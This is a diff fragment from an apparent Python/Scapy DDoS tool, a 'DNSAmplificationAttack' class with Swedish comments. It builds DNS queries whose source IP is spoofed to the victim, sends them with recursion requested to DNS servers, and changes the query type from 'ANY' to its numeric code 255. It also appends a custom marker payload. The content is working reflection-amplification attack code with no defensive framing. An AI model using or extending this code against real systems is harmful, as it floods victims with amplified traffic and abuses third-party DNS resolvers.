@@ -54,7 +54,7 @@ class DNSAmplificationAttack(BaseAttack):
             # Source IP är spoofad till target (amplification!)
             dns_query = IP(src=self.target_ip, dst=dns_server)/ \
                        UDP(sport=fake_sport, dport=53)/ \
-                       DNS(rd=1, qd=DNSQR(qname=query_domain, qtype='ANY'))
+                       DNS(rd=1, qd=DNSQR(qname=query_domain, qtype=255))
 
             # Lägg till custom payload
             payload_marker = f"\n[{self.custom_message}_DNS_AMP_{i+1}]".encode()
